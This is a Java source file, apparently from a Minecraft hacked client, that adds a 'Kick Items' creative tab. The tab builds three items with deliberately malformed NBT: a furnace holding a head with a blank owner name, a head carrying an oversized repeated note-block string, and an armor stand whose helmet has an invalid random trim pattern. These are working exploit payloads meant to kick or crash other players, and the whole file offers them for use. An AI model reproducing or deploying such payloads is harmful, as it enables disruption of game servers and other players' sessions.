package de.vandalismdevelopment.vandalism.creativetab.impl;

import de.vandalismdevelopment.vandalism.creativetab.CreativeTab;
import de.vandalismdevelopment.vandalism.util.ItemUtil;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.nbt.NbtCompound;
import net.minecraft.nbt.NbtList;
import net.minecraft.text.Text;
import net.minecraft.util.Formatting;
import org.apache.commons.lang3.RandomStringUtils;

import java.util.Collection;

public class KickItemsCreativeTab extends CreativeTab {

    public KickItemsCreativeTab() {
        super(
                Text.literal("Kick Items"),
                new ItemStack(Items.FIREWORK_ROCKET)
        );
    }

    @Override
    public Collection<ItemStack> entries() {
        final Collection<ItemStack> current = super.entries();
        current.add(ItemUtil.appendClientSideInfoToItemStack(
                this.createKickHead(),
                Text.literal(Formatting.RED + Formatting.BOLD.toString() + "Kick Head")
        ));
        current.add(ItemUtil.appendClientSideInfoToItemStack(
                this.createKickHeadV2(),
                Text.literal(Formatting.RED + Formatting.BOLD.toString() + "Kick Head V2")
        ));
        current.add(ItemUtil.appendClientSideInfoToItemStack(
                this.createKickStand(),
                Text.literal(Formatting.RED + Formatting.BOLD.toString() + "Kick Stand")
        ));
        return current;
    }

    private ItemStack createKickHead() {
        final ItemStack item = new ItemStack(Items.FURNACE);
        final NbtCompound base = new NbtCompound();
        final NbtCompound blockEntityTag = new NbtCompound();
        final NbtList items = new NbtList();
        final NbtCompound firstSlot = new NbtCompound();
        firstSlot.putByte("Slot", (byte) 0);
        firstSlot.putString("id", "minecraft:player_head");
        firstSlot.putByte("Count", (byte) 1);
        final NbtCompound skullOwner = new NbtCompound();
        skullOwner.putString("SkullOwner", " ");
        firstSlot.put("tag", skullOwner);
        items.add(firstSlot);
        blockEntityTag.put("Items", items);
        base.put("BlockEntityTag", blockEntityTag);
        item.setNbt(base);
        return item;
    }

    private ItemStack createKickHeadV2() {
        final ItemStack item = new ItemStack(Items.PLAYER_HEAD);
        final NbtCompound base = new NbtCompound();
        final NbtCompound blockEntityTag = new NbtCompound();
        blockEntityTag.putString(
                "note_block_sound",
                RandomStringUtils.randomAlphabetic(5).toLowerCase().repeat(6552)
        );
        base.put("BlockEntityTag", blockEntityTag);
        item.setNbt(base);
        return item;
    }

    private ItemStack createKickStand() {
        final ItemStack item = new ItemStack(Items.ARMOR_STAND);
        final NbtCompound base = new NbtCompound();
        final NbtCompound entityTag = new NbtCompound();
        final NbtList armorItems = new NbtList();
        final NbtCompound firstArmorItem = new NbtCompound();
        final NbtCompound armorItemBase = new NbtCompound();
        final NbtCompound armorTrim = new NbtCompound();
        armorTrim.putString(
                "pattern",
                RandomStringUtils.random(5).toLowerCase() + ":" +
                        RandomStringUtils.random(5).toUpperCase()
        );
        armorTrim.putString("material", "minecraft:amethyst");
        armorItemBase.put("Trim", armorTrim);
        firstArmorItem.put("tag", armorItemBase);
        firstArmorItem.putByte("Count", (byte) 1);
        firstArmorItem.putString("id", "minecraft:diamond_helmet");
        armorItems.add(firstArmorItem);
        entityTag.put("ArmorItems", armorItems);
        base.put("EntityTag", entityTag);
        item.setNbt(base);
        return item;
    }

}
